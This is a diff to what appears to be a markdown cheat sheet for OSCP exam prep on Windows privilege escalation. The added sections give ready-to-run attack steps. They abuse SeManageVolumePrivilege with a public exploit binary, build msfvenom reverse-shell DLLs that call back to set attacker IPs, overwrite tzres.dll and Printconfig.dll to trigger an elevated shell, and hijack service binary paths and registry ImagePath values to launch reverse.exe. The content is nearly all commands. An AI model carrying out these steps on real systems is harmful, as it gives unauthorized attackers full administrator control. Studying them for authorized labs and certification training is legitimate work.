@@ -855,6 +855,70 @@ and Now open the RDP session and enter windows + U and you will get adminstrator
 
 # rdesktop DC01.heist.offsec
 ```
+### SeManageVolumePrivilege [Reffer `Access` AD Box in PG cherrytree]
+
+Resource : https://github.com/xct/SeManageVolumeAbuse
+
+If some times it is patched then you can take a look on : https://github.com/CsEnox/SeManageVolumeExploit
+
+share the file SeManageVolumeExploit.exe to the target machine and execute it !!
+
+This exploit grants full permission on C:\ drive for all users on the machine.
+
+-   Enables the privilege in the token
+-   Creates handle to \.\C: with SYNCHRONIZE | FILE_TRAVERSE
+-   Sends the FSCTL_SD_GLOBAL_CHANGE to replace S-1-5-32-544 with S-1-5-32-545
+
+Upload to the target Systen and execute it !!
+```powershell
+PS> .\SeManageVolumeExploit.exe
+```
+
+![image](https://github.com/kullaisec/OSCP/assets/99985908/5353660e-bd36-4d2c-a2af-76c2a3b0dd06)
+
+Now navigate to `C:\Windows\System32\wbem` now we have to replace the `.dll` file !!
+
+```powershell
+# msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.193 LPORT=6666 -f dll -o tzres.dll
+```
+After successfully replacing Just type `systeminfo` and listen on port 6666 you will get elevated shell !!
+
+#### Medthod 2
+
+Another Method PrivEsc:
+
+https://github.com/CsEnox/SeManageVolumeExploit → read this !!
+```powershell
+PS C:\xampp\htdocs\uploads> .\SeManageVolumeExploit.exe
+```
+![image](https://github.com/kullaisec/OSCP/assets/99985908/22cd4f93-8387-4313-85f0-53129ef97bee)
+
+```bash
+# msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=6666 -f dll -o Printconfig.dll
+```
+
+We need to replace the file : `C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll`
+
+```powershell
+PS C:\xampp\htdocs\uploads> Copy-Item -Path "C:\xampp\htdocs\uploads\Printconfig.dll" -Destination "C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll" -Force
+```
+
+and Listen on `6666`
+```bash
+# rlwrap -cAr nc -lvnp 6666
+```
+Enter the following commands :
+
+```powershell
+PS C:\xampp\htdocs\uploads> $type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
+
+PS C:\xampp\htdocs\uploads> $object = [Activator]::CreateInstance($type)
+```
+![image](https://github.com/kullaisec/OSCP/assets/99985908/a22879da-2099-4290-8359-a96a38fc4f12)
+
+you can see we got the adminsitrator access !!
+
+
 ### Installed Applications x64 and x86
 ```powershell
 x86
@@ -933,7 +997,15 @@ PS> net stop KiteService
 ```powershell
 PS> net start KiteService
 ```
-### Windows Binary PrivEscs:
+### Windows Binary PrivEscs:[Binary Hijacking]
+
+```powershell
+#Identify service from winpeas
+icalcs "path" #F means full permission, we need to check we have full access on folder
+sc qc <servicename> #find binarypath variable
+sc config <service> <option>="<value>" #change the path to the reverseshell location
+sc start <servicename>
+```
 
 #### Add Existing User to Local-Admin :
 
@@ -949,6 +1021,23 @@ int main() {
 #### Cross Compilation:
 ```powershell
 # x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+```
+
+### Weak Registry Permissions
+
+```powershell
+#Look for the following in Winpeas services info output
+HKLM\system\currentcontrolset\services\<service> (Interactive [FullControl]) #This means we have full access
+
+accesschk /acceptula -uvwqk <path of registry> #Check for KEY_ALL_ACCESS
+
+#Service Information from regedit, identify the variable which holds the executable
+reg query <reg-path>
+
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+#Imagepath is the variable here
+
+net start <service>
 ```
 
 #### Add New User as Local Admin and have RDP access
@@ -1006,15 +1095,6 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attaker-IP> LPORT=<listening-po
 - Copy it to victom machine and them move it to the service associated directory.(Make sure the dll name is similar to missing name)
 - Start listener and restart service, you'll get a shell.
 
-### Binary Hijacking
-
-```powershell
-#Identify service from winpeas
-icalcs "path" #F means full permission, we need to check we have full access on folder
-sc qc <servicename> #find binarypath variable
-sc config <service> <option>="<value>" #change the path to the reverseshell location
-sc start <servicename>
-```
 
 ### SeShutdownPrivilege
 
